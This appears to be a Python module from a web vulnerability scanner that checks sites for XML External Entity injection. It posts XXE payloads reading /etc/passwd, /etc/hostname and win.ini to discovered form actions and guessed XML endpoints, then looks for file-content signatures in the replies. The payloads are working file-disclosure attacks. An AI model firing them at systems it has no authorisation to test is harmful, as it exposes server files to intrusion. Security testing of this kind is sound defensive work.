import re
from typing import Optional
from urllib.parse import urljoin, urlparse

import requests

XXE_PAYLOADS = [
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><data>&xxe;</data></root>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><item>&xxe;</item></root>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>
<foo>&xxe;</foo>""",
]

XXE_SIGNATURES = [
    r"root:[x*]?:0:0:",
    r"\[fonts\]",
    r"\[extensions\]",
    r"for 16-bit app support",
]

XML_CONTENT_TYPES = {"application/xml", "text/xml", "application/soap+xml"}

XML_ENDPOINT_PATTERNS = ["/xml", "/soap", "/api/xml", "/wsdl", "/.xml"]


def check_xxe(url: str, html_content: str = "", session: Optional[requests.Session] = None) -> list[dict[str, str]]:
    results: list[dict[str, str]] = []
    client = session if session is not None else requests

    urlparse(url)

    targets = []
    form_actions = re.findall(r'<form[^>]+action="([^"]+)"', html_content, re.IGNORECASE)
    for action in form_actions:
        resolved = urljoin(url, action)
        targets.append(resolved)

    for pattern in XML_ENDPOINT_PATTERNS:
        candidate = urljoin(url, pattern)
        try:
            r = client.get(candidate, timeout=4)
            if r.status_code < 500:
                targets.append(candidate)
        except requests.RequestException:
            pass

    targets.append(url)

    seen = set()
    for target in targets:
        if target in seen:
            continue
        seen.add(target)

        for payload in XXE_PAYLOADS:
            baseline = ""
            try:
                r = client.get(target, timeout=5)
                baseline = r.text
            except requests.RequestException:
                pass

            for content_type in XML_CONTENT_TYPES:
                headers = {"Content-Type": content_type}
                try:
                    r = client.post(target, data=payload, headers=headers, timeout=6)
                    diff = r.text.replace(baseline, "")

                    for sig in XXE_SIGNATURES:
                        if re.search(sig, diff, re.IGNORECASE) and not re.search(sig, baseline, re.IGNORECASE):
                            results.append({
                                "vuln": "XML External Entity Injection (XXE)",
                                "risk": "Alto",
                                "detail": f"Posible XXE en '{target}' con Content-Type '{content_type}'. Se detecto contenido del sistema en la respuesta: '{sig}'"
                            })
                            return results
                except requests.RequestException:
                    continue

    return results
